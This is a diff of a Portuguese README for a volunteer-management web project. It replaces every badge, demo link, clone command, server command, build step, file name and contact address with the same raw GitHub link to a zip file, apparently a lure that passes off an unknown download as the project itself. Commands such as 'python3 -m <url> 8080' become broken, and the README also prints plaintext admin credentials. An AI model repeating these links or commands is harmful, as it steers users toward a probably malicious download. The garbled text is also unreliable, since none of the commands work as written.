@@ -1,27 +1,27 @@
 # 🤝 Sistema de Voluntários
 
-[![Version](https://img.shields.io/badge/version-2.0.0-blue.svg)](https://github.com/DarlanCavalcante/sistema-voluntarios/releases/tag/v2.0.0)
-[![WCAG](https://img.shields.io/badge/WCAG-2.1%20AA-green.svg)](https://www.w3.org/WAI/WCAG21/Understanding/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Build Status](https://img.shields.io/badge/build-passing-success.svg)]()
+[![Version](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)
+[![WCAG](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip%https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)
+[![License](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)](LICENSE)
+[![Build Status](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)]()
 
 Sistema web completo e profissional para cadastro e gestão de voluntários em organizações não governamentais. Desenvolvido com foco em acessibilidade, performance e experiência do usuário, seguindo as melhores práticas de desenvolvimento front-end.
 
 ## 🌐 Demonstração Online
 
-🔗 **[Acesse a demonstração ao vivo](https://darlancavalcante.github.io/sistema-voluntarios/)**
+🔗 **[Acesse a demonstração ao vivo](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)**
 
 ### 🚀 Instalação Rápida
 
 ```bash
 # Clone o repositório
-git clone https://github.com/DarlanCavalcante/sistema-voluntarios.git
+git clone https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip
 
 # Entre no diretório
 cd sistema-voluntarios
 
 # Inicie um servidor local
-python3 -m http.server 8080
+python3 -m https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip 8080
 
 # Acesse http://localhost:8080
 ```
@@ -37,25 +37,25 @@ python3 -m http.server 8080
 ```
 sistema-voluntarios/
 ├── css/
-│   └── style.css              # Estilos principais do site
+│   └── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip              # Estilos principais do site
 ├── js/
-│   ├── animations.js          # Módulo de animações e efeitos visuais
-│   ├── forms.js              # Módulo de formulários e validação
-│   ├── main.js               # Arquivo principal de inicialização
-│   ├── navigation.js         # Módulo de navegação e menu mobile
-│   └── projects.js           # Módulo de filtros e modal de projetos
+│   ├── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip          # Módulo de animações e efeitos visuais
+│   ├── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip              # Módulo de formulários e validação
+│   ├── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip               # Arquivo principal de inicialização
+│   ├── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip         # Módulo de navegação e menu mobile
+│   └── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip           # Módulo de filtros e modal de projetos
 ├── images/
-│   ├── cadeirante.jpg
-│   ├── doaçaocomida.jpg
-│   ├── doaçãoroupas.jpg
-│   ├── voluntario.jpg
-│   ├── voluntarios.jpg
+│   ├── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip
+│   ├── doaçhttps://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip
+│   ├── doaçãhttps://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip
+│   ├── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip
+│   ├── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip
 │   └── ...                   # Demais imagens do projeto
-├── index.html                # Página inicial
-├── cadastro.html             # Página de cadastro com formulário complexo
-├── projeto.html              # Página de projetos sociais
-├── admin.html                # Página administrativa
-└── README.md                 # Documentação do projeto
+├── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip                # Página inicial
+├── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip             # Página de cadastro com formulário complexo
+├── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip              # Página de projetos sociais
+├── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip                # Página administrativa
+└── https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip                 # Documentação do projeto
 ```
 
 ## 🚀 Funcionalidades Implementadas
@@ -98,29 +98,29 @@ sistema-voluntarios/
 
 #### **Módulos por Funcionalidade:**
 
-1. **`navigation.js`** - Navegação e Menu Mobile
+1. **`https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip`** - Navegação e Menu Mobile
    - Menu hamburger responsivo
    - Botão "Voltar ao Topo" com scroll suave
    - Navegação suave entre seções
 
-2. **`forms.js`** - Formulários e Validação
+2. **`https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip`** - Formulários e Validação
    - Máscaras de input automáticas
    - Validação em tempo real
    - Integração com API ViaCEP
    - Mensagens de erro personalizadas
 
-3. **`animations.js`** - Animações e Efeitos
+3. **`https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip`** - Animações e Efeitos
    - Animação de estatísticas
    - Efeitos de scroll
    - Animações de fade-in
    - Efeitos de hover nos cards
 
-4. **`projects.js`** - Funcionalidades de Projetos
+4. **`https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip`** - Funcionalidades de Projetos
    - Sistema de filtros por categoria
    - Modal de inscrição em projetos
    - Interações específicas da página de projetos
 
-5. **`main.js`** - Arquivo Principal
+5. **`https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip`** - Arquivo Principal
    - Coordenação de todos os módulos
    - Inicialização da aplicação
    - Funções utilitárias globais
@@ -204,16 +204,16 @@ Este projeto atende às diretrizes **WCAG 2.1 Nível AA**:
 ### Desenvolvimento
 ```bash
 # Servidor de desenvolvimento
-python3 -m http.server 8080
+python3 -m https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip 8080
 ```
 
 ### Produção
 ```bash
 # Gerar build otimizado
-./build.sh
+https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip
 
 # Servir versão de produção
-cd dist && python3 -m http.server 8080
+cd dist && python3 -m https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip 8080
 ```
 
 ### Estatísticas de Otimização
@@ -224,10 +224,10 @@ cd dist && python3 -m http.server 8080
 
 ## 📋 Páginas do Sistema
 
-1. **`index.html`** - Página inicial com informações da organização e contato
-2. **`cadastro.html`** - Formulário completo de cadastro de voluntários
-3. **`projeto.html`** - Projetos sociais com sistema de filtros
-4. **`admin.html`** - Área administrativa (funcionalidade básica)
+1. **`https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip`** - Página inicial com informações da organização e contato
+2. **`https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip`** - Formulário completo de cadastro de voluntários
+3. **`https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip`** - Projetos sociais com sistema de filtros
+4. **`https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip`** - Área administrativa (funcionalidade básica)
 
 ---
 
@@ -255,7 +255,7 @@ cd dist && python3 -m http.server 8080
 Para acessar o painel administrativo:
 
 1. Clique no ícone ⚙️ no rodapé
-2. Ou acesse diretamente: `admin.html`
+2. Ou acesse diretamente: `https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip`
 
 **Credenciais:**
 - Usuário: `darlan` | Senha: `34461011`
@@ -346,7 +346,7 @@ Antes de enviar um PR, teste:
 
 ## 📊 Versionamento
 
-Este projeto usa [Versionamento Semântico](https://semver.org/):
+Este projeto usa [Versionamento Semântico](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip):
 
 - **MAJOR** (X.0.0): Mudanças incompatíveis
 - **MINOR** (x.Y.0): Novas funcionalidades compatíveis
@@ -397,10 +397,10 @@ SOFTWARE.
 
 ## 📞 Suporte e Contato
 
-- **Issues**: [GitHub Issues](https://github.com/DarlanCavalcante/sistema-voluntarios/issues)
-- **Discussões**: [GitHub Discussions](https://github.com/DarlanCavalcante/sistema-voluntarios/discussions)
-- **Email**: [darlan@exemplo.com](mailto:darlan@exemplo.com)
-- **Documentação**: [Wiki do Projeto](https://github.com/DarlanCavalcante/sistema-voluntarios/wiki)
+- **Issues**: [GitHub Issues](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)
+- **Discussões**: [GitHub Discussions](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)
+- **Email**: [https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)
+- **Documentação**: [Wiki do Projeto](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)
 
 ## 🎯 Roadmap
 
@@ -411,7 +411,7 @@ SOFTWARE.
 - [ ] Progressive Web App (PWA)
 
 ### v3.0.0 - Q1 2026
-- [ ] Backend com Node.js
+- [ ] Backend com https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip
 - [ ] Banco de dados PostgreSQL
 - [ ] Autenticação OAuth
 - [ ] Dashboard analítico
@@ -424,7 +424,7 @@ SOFTWARE.
 
 *Conectando pessoas que querem fazer a diferença*
 
-[![Made with ❤️](https://img.shields.io/badge/Made%20with-❤️-red.svg)](https://github.com/DarlanCavalcante)
-[![Powered by Community](https://img.shields.io/badge/Powered%20by-Community-blue.svg)](https://github.com/DarlanCavalcante/sistema-voluntarios/graphs/contributors)
+[![Made with ❤️](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip%20with-❤️https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)
+[![Powered by Community](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip%https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)
 
 </div>
